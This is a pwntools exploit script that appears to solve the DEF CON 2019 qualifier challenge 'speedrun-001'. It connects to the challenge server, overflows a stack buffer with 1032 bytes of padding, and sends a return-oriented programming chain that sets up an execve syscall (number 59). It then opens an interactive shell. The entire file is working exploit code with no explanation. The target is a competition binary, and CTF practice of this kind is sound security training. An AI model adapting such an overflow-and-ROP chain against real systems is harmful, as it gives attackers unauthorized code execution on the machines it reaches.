from pwn import *

#p = process('./speedrun-001')
p = remote('speedrun-001.quals2019.oooverflow.io',31337)

p.recvuntil('Any last words?\n')

payload = 'A'*1032 + p64(0x0000000000415664) + p64(59) + p64(0x0000000000400686)+p64(0x000000000049283b) + p64(0x00000000004101f3)+p64(0)+p64(0x00000000004498b5)+p64(0)+p64(0x000000000046817a)
#gdb.attach(p)
p.sendline(payload)
p.interactive()
